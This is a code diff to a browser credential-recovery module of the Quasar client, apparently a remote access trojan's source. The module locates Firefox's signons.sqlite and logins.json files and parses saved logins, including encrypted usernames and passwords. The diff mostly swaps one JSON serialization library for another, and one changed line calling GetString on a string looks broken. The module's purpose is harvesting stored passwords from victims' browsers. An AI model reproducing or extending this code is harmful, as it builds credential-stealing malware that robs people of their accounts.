@@ -1,10 +1,9 @@
-﻿using Quasar.Client.Helper;
-using Quasar.Client.Recovery.Utilities;
-using Quasar.Common.Models;
+﻿using Quasar.Client.Recovery.Utilities;
+using Quasar.Common;
 using System;
 using System.Collections.Generic;
 using System.IO;
-using System.Runtime.Serialization;
+using Newtonsoft.Json;
 
 namespace Quasar.Client.Recovery.Browsers
 {
@@ -31,7 +30,7 @@ namespace Quasar.Client.Recovery.Browsers
 
                 string[] files = Directory.GetFiles(dir, "signons.sqlite");
                 if (files.Length > 0)
-				{
+                {
                     signonsFile = files[0];
                     signonsFound = true;
                 }
@@ -99,7 +98,7 @@ namespace Quasar.Client.Recovery.Browsers
                             FFLogins ffLoginData;
                             using (var sr = File.OpenRead(loginsFile))
                             {
-                                ffLoginData = JsonHelper.Deserialize<FFLogins>(sr);
+                                ffLoginData = JsonConvert.DeserializeObject<FFLogins>(sr.ReadToEnd().GetString());
                             }
 
                             foreach (Login loginData in ffLoginData.Logins)
@@ -123,75 +122,71 @@ namespace Quasar.Client.Recovery.Browsers
             return logins;
         }
 
-        [DataContract]
         private class FFLogins
         {
-            [DataMember(Name = "nextId")]
+            [JsonProperty("nextId")]
             public long NextId { get; set; }
 
-            [DataMember(Name = "logins")]
+            [JsonProperty("logins")]
             public Login[] Logins { get; set; }
 
-            [IgnoreDataMember]
-            [DataMember(Name = "potentiallyVulnerablePasswords")]
+            [JsonIgnore]
+            [JsonProperty("potentiallyVulnerablePasswords")]
             public object[] PotentiallyVulnerablePasswords { get; set; }
 
-            [IgnoreDataMember]
-            [DataMember(Name = "dismissedBreachAlertsByLoginGUID")]
+            [JsonIgnore]
+            [JsonProperty("dismissedBreachAlertsByLoginGUID")]
             public DismissedBreachAlertsByLoginGuid DismissedBreachAlertsByLoginGuid { get; set; }
 
-            [DataMember(Name = "version")]
+            [JsonProperty("version")]
             public long Version { get; set; }
         }
-
-        [DataContract]
         private class DismissedBreachAlertsByLoginGuid
         {
         }
 
-        [DataContract]
         private class Login
         {
-            [DataMember(Name = "id")]
+            [JsonProperty("id")]
             public long Id { get; set; }
 
-            [DataMember(Name = "hostname")]
+            [JsonProperty("hostname")]
             public Uri Hostname { get; set; }
 
-            [DataMember(Name = "httpRealm")]
+            [JsonProperty("httpRealm")]
             public object HttpRealm { get; set; }
 
-            [DataMember(Name = "formSubmitURL")]
+            [JsonProperty("formSubmitURL")]
             public Uri FormSubmitUrl { get; set; }
 
-            [DataMember(Name = "usernameField")]
+            [JsonProperty("usernameField")]
             public string UsernameField { get; set; }
 
-            [DataMember(Name = "passwordField")]
+            [JsonProperty("passwordField")]
             public string PasswordField { get; set; }
 
-            [DataMember(Name = "encryptedUsername")]
+            [JsonProperty("encryptedUsername")]
             public string EncryptedUsername { get; set; }
 
-            [DataMember(Name = "encryptedPassword")]
+            [JsonProperty("encryptedPassword")]
             public string EncryptedPassword { get; set; }
 
-            [DataMember(Name = "guid")]
+            [JsonProperty("guid")]
             public string Guid { get; set; }
 
-            [DataMember(Name = "encType")]
+            [JsonProperty("encType")]
             public long EncType { get; set; }
 
-            [DataMember(Name = "timeCreated")]
+            [JsonProperty("timeCreated")]
             public long TimeCreated { get; set; }
 
-            [DataMember(Name = "timeLastUsed")]
+            [JsonProperty("timeLastUsed")]
             public long TimeLastUsed { get; set; }
 
-            [DataMember(Name = "timePasswordChanged")]
+            [JsonProperty("timePasswordChanged")]
             public long TimePasswordChanged { get; set; }
 
-            [DataMember(Name = "timesUsed")]
+            [JsonProperty("timesUsed")]
             public long TimesUsed { get; set; }
         }
     }
